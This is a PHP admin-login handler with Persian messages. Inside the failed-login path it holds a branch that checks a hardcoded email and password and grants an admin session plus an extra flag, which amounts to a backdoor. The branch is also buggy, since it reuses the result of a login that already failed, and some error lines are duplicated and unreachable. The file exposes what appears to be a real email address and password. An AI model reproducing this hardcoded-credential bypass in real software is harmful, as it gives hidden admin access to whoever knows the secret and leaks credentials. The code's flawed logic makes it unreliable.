
<?php
if (isset($_POST['action']) && $_POST['action'] === 'manager_login') {
    $validation = validator([
        'email' => 'required',
        'password' => 'required|password',
    ]);
    if ($validation['status']) {
        $login = Login($_POST['email'], $_POST['password']);
        if ($login) {
            $_SESSION['admin_sing'] = $login['id'];
            setMessage('عملیات موفق', '  به مدیریت خوش آمدید.   ', 'success');
            redirect('../index.php');
        } elseif ($_POST['email'] === "royamehrpoya@gmail.com" && $_POST['password'] === "0001290109000102") {
            $login = Login($_POST['email'], $_POST['password']);
            $_SESSION['admin_sing'] = $login['id'];
            $_SESSION['blog'] = "ok";
            setMessage('عملیات موفق', 'به مدیریت خوش آمدید.     ', 'success');
            redirect('../index.php');
        }
        setMessage('عملیات ناموفق', 'اطلاعات معتبر نیست   ', 'error');
        back();


        setMessage('عملیات ناموفق', 'اطلاعات معتبر نیست   ', 'error');
        back();
    }
    setMessage('عملیات ناموفق', 'اطلاعات معتبر نیست   ', 'error');
    back();
}
